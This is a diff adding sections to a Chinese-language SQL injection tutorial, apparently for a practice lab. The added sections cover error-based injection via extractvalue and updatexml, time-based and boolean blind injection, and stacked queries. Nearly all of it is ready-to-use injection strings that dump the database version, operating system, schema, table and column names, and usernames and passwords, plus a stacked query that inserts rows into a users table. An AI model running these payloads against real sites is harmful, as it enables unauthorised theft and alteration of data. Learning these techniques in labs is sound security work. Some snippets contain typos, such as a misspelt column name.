@@ -452,27 +452,206 @@ id =1' union select 1,count(),concat(0x7e,(select 字段名 from 表名 limit 2,
 
 ### <mark style="color:yellow;">②extractvalue（）报错</mark>
 
+其实在前面介绍函数的时候就提到了，就是在xml文档路径的位置里写入了子查询，并且输入了特殊字符0x7e，输入不符合规则然后报错了。但是报错的时候已经执行了子查询代码。
+
+并且要与where联用。
+
+#### <mark style="color:purple;">(1)爆版本号</mark>
+
+```sql
+id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+
+```
+
+#### <mark style="color:purple;">（2）爆出操作系统</mark>
+
+```sql
+id=1' and extractvalue(1,concat(0x7e,(select @@version_compile_os),0x7e))--+
+```
+
+#### <mark style="color:purple;">(3)爆出数据库</mark>
+
+```sql
+id=1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))--+
+```
+
+#### <mark style="color:purple;">(4)爆数据表</mark>
+
+```sql
+id =1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 3,1),0x7e))--+
+```
+
+#### <mark style="color:purple;">(5)爆字段</mark>
+
+```sql
+id =1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' limit 3,1),0x7e))--+
+```
+
+#### <mark style="color:purple;">(6)爆数据</mark>
+
+```sql
+id=1'and extractvalue(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from 数据表 limit 7,1),0x7e))--+
+```
 
 
 
+### <mark style="color:yellow;">③updatexml()函数</mark>
+
+还是因为0x7e不符合xpath语法，因此爆出xpath语法错误。
+
+这里有个细节问题，就是在updatexml函数里面比extractvalue最后多加一个1就可以了。
+
+#### <mark style="color:purple;">(1)爆数据库</mark>
+
+```sql
+id=1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+
+```
+
+#### <mark style="color:purple;">(2)爆数据表</mark>
+
+```sql
+id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+
+```
+
+#### <mark style="color:purple;">(3)爆字段</mark>
+
+```sql
+id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='数据表名' limit 3,1),0x7e),1)--+
+```
+
+#### <mark style="color:purple;">(4)爆数据</mark>
+
+```sql
+id=1' and updatexml(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from 数据表名 limit 7,1),0x7e),1)--+
+```
+
+***
+
+## <mark style="color:green;">(8)盲注</mark>
+
+这里有一些常用函数需要知道
+
+> length()           返回字符串的长度
+>
+> substr()           截取字符串（语法：substr（str，pos，len）；）
+>
+> scii()                  返回字符和ascii码
+>
+> sleep()              将程序挂起一段时间n为n秒
+>
+> if（expr1，expr2，expr3）      判断语句，如果expr1正确就执行expr2，否则执行expr3
 
 
 
+### <mark style="color:yellow;">①时间盲注</mark>
 
+就是利用sleep函数，通过web页面返回的时间差来判断注入语句是否正确。有时候和if语句一起用。
 
+#### <mark style="color:purple;">(1)判断注入点</mark>
 
+```sql
+id=1' and sleep(5) --+
+```
 
+如果页面返回返回了5s，那么就说明闭合是用的'。
 
+```sql
+id=1" and sleep(5) --+
+```
 
+```sql
+id=1') and sleep(5) --+
+```
 
+```sql
+id=1") and sleep(5) --+
+```
 
+#### <mark style="color:purple;">(2)爆出数据库</mark>
 
+首先判断数据库名的长度。
 
+```sql
+id=1' and if(length(database())=8,sleep(10),1)--+
+```
 
+然后一位一位的判断ascii
 
+```sql
+id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(10))--+
+```
 
+一般通过substr(database(),N,1)改变N的值来判断数据的值是多少。
 
+#### <mark style="color:purple;">（3）爆出数据表：</mark>
 
+```sql
+id=1' and if((select ascii(substr((select table_name from information_schema.tables where table_schema="数据库名" limit 0,1),1,1)))=101,sleep(5),1)--+
+```
+
+同理是需要改变的
+
+#### <mark style="color:purple;">(4)爆出列名</mark>
+
+```sql
+id=1' and if((select ascii(substr((select column_name from information_schema.columns where table_name="数据表名" limit 0,1),1,1)))=101,sleep(5),1)--+
+```
+
+一样。
+
+### <mark style="color:yellow;">②布尔盲注</mark>
+
+#### <mark style="color:purple;">（1）left判断</mark>
+
+就是从左往右数前几位是什么。
+
+这里只写几句简单的，不全部写了，因为道理都是一样的。
+
+```sql
+id=1' and left(database(),1)='s' --+
+```
+
+```sql
+id=1'and left(database(),2)>'sa' --+
+```
+
+#### <mark style="color:purple;">(2)like语句判断</mark>
+
+就是看名字是不是某个样子的。
+
+```sql
+id =1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'e%' --+
+```
+
+#### <mark style="color:purple;">(3)ascii语句判断</mark>
+
+```sql
+id =1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
+```
+
+***
+
+## <mark style="color:green;">(9)堆叠注入</mark>
+
+就是通过;将两个sql语句分开，再执行了第一个语句后，后面的语句就可以由攻击者任意指定。
+
+#### <mark style="color:purple;">（1）查看字段</mark>
+
+```sql
+id =1' order by 3--+
+```
+
+#### <mark style="color:purple;">(2)查看表名</mark>
+
+```sql
+id =1'; show tables %23
+```
+
+#### <mark style="color:purple;">(3)插入数据</mark>
+
+```sql
+id=1'; insert into users(id,usrenamt,password)
+values(88,'aaa','bbb') #
+```
 
 
 
